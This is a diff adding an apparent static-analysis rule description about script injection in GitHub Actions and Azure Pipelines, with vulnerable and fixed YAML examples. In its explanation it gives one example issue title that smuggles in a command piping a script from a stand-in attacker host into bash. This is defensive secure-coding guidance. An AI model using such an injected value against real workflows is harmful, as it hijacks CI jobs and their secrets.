@@ -1,0 +1,46 @@
+<h2>Why is this an issue?</h2>
+<p>GitHub evaluates <code>${{ }}</code> expressions <em>before</em> the shell runs, by pasting their value into the script text. When the value comes from an issue title, a pull request body, a comment, a commit message or a branch name, whoever wrote that text decides what the script contains. A title such as <code>a"; curl -sSfL https://evil.example/x.sh | bash; echo "</code> runs arbitrary commands with the job's <code>GITHUB_TOKEN</code> and secrets.</p>
+<p>The same applies to the <code>script</code> input of <code>actions/github-script</code>, where the value becomes JavaScript source.</p>
+<p>Azure Pipelines works the same way: <code>$(Build.SourceVersionMessage)</code>, <code>$(Build.SourceBranch)</code>, <code>$(System.PullRequest.SourceBranch)</code>, <code>$(Build.RequestedFor)</code> and their <code>${{ }}</code>/<code>$[ ]</code> forms are replaced in the script text before <code>script</code>, <code>bash</code>, <code>pwsh</code>, <code>powershell</code> or script tasks run. Commit messages and branch names are chosen by whoever pushes.</p>
+<h2>How to fix it</h2>
+<p>Pass the value through an environment variable and reference it as a shell variable, inside double quotes. The shell then treats it as data, never as code.</p>
+<h3>Noncompliant code example</h3>
+<pre>
+on: issues
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "New issue: ${{ github.event.issue.title }}"  # Noncompliant
+</pre>
+<h3>Compliant solution</h3>
+<pre>
+on: issues
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          TITLE: ${{ github.event.issue.title }}
+        run: echo "New issue: $TITLE"
+</pre>
+<h3>Noncompliant code example (Azure Pipelines)</h3>
+<pre>
+steps:
+  - bash: echo "Building $(Build.SourceVersionMessage)"  # Noncompliant
+</pre>
+<h3>Compliant solution (Azure Pipelines)</h3>
+<p>Every predefined variable is also an environment variable of the step.</p>
+<pre>
+steps:
+  - bash: echo "Building $BUILD_SOURCEVERSIONMESSAGE"
+</pre>
+<h2>Resources</h2>
+<ul>
+  <li><a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections">GitHub Docs - Understanding the risk of script injections</a></li>
+  <li><a href="https://securitylab.github.com/resources/github-actions-untrusted-input/">GitHub Security Lab - Keeping your GitHub Actions and workflows secure: Untrusted input</a></li>
+  <li><a href="https://learn.microsoft.com/en-us/azure/devops/pipelines/security/inputs">Microsoft Learn - Securing Azure Pipelines: inputs</a></li>
+  <li>CWE-77 - Improper Neutralization of Special Elements used in a Command ('Command Injection')</li>
+  <li>CWE-78 - Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</li>
+  <li>CWE-94 - Improper Control of Generation of Code ('Code Injection')</li>
+</ul>
